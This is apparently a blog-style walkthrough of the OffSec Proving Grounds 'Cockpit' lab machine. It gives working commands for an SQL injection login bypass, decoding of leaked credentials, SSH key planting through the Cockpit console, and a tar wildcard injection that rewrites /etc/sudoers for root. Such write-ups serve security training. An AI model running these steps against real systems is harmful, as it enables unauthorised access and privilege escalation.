# Cockpit — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Linux

---

## TL;DR

SQL injection on a login page → leaked base64 credentials → SSH via Cockpit web console by adding our public key → wildcard injection with `tar` for privilege escalation.

---

## Enumeration

Starting off with a full port scan to see what we're working with:

```bash
sudo nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.226.10 -oN nmap_out.txt
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache httpd 2.4.41 |
| 9090 | HTTPS | Cockpit Web Console |

Port 9090 immediately catches our eye — that's the **Cockpit** web-based server management interface. When we check the SSL certificate, there's a hostname `blaze` and an interesting organization field that looks like an MD5 hash:

```
Organization: d2737565435f491e97f49bb5b34ba02e
Common Name:  blaze
```

Noted. Let's move on to directory enumeration on port 80:

```bash
gobuster dir -u http://192.168.203.10/ -w `/usr/share/wordlists/dirb/common.txt` -t 42 -b 404,403,400 -x php
```

This reveals a `/login.php` page — nice.

---

## Exploitation — SQL Injection

Heading over to `http://192.168.203.10/login.php`, we're greeted with a login form. Classic.

I tried a few SQLi payloads manually and got blocked. Brute force wasn't going to work here. After digging through the [SecLists MySQL SQLi bypass payloads](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt), one of them finally hit:

```
'OR '' = '
```

And just like that, we're in. The dashboard dumps out a couple of users with their **base64-encoded passwords**:

| Username | Encoded Password |
|----------|-----------------|
| james | `Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=` |
| cameron | `dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy` |

Decoding these:

```
james:canttouchhhthiss@455152
cameron:thisscanttbetouchedd@455152
```

---

## Getting a Shell — SSH via Cockpit

We can use James' credentials to log into the Cockpit web console on port 9090. Once inside, there's a fully interactive web terminal — but hold up, **OSCP rules don't consider web shells as valid shells**. We need proper SSH or a reverse shell.

No worries though — Cockpit has a nice profile page where we can add SSH authorized keys. So the plan is:

1. Generate an SSH key pair on our attack machine:

```bash
ssh-keygen -f james
```

2. Paste the **public key** (`james.pub`) into the Cockpit SSH keys section and save.

3. SSH in with the private key:

```bash
ssh -i james james@192.168.203.10
```

We're in as `james`. Time to escalate.

---

## Privilege Escalation — Tar Wildcard Injection

Let's check what `james` can run with sudo:

```bash
james@blaze:~$ sudo -l
```

```
User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

So we can run `tar` with sudo, but it's a **specific command** — we can't just use the standard GTFOBins tar trick. However, that wildcard (`*`) at the end is our ticket in. This is a classic **wildcard injection** attack.

Here's how it works:

1. Create a payload script in `/tmp`:

```bash
echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

Save this as `payload.sh`.

2. In `/tmp`, create filenames that tar will interpret as command-line arguments:

```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
```

When `tar` encounters the wildcard `*`, it expands these filenames and treats them as actual flags. The `--checkpoint-action` flag tells tar to execute our payload script at the checkpoint.

3. Run the sudo tar command:

```bash
sudo tar -czvf /tmp/backup.tar.gz *
```

4. Verify our escalation:

```bash
sudo -l
```

```
User james may run the following commands on blaze:
    (root) NOPASSWD: ALL
```

We can now `sudo su` and we're **root**. 🎉

---

## Key Takeaways

- **SQL Injection** — Always try payloads from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt) when manual attempts fail
- **Cockpit Web Console** — Remember you can add SSH keys through the profile page for proper shell access
- **Tar Wildcard Injection** — When `tar` is used with `*` in a sudo command, you can craft filenames that get interpreted as tar arguments. Great resource: [Linux Privilege Escalation — Wildcards with Tar](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)

---

*Thanks for reading! If you found this helpful, feel free to follow for more OffSec walkthrough content.*
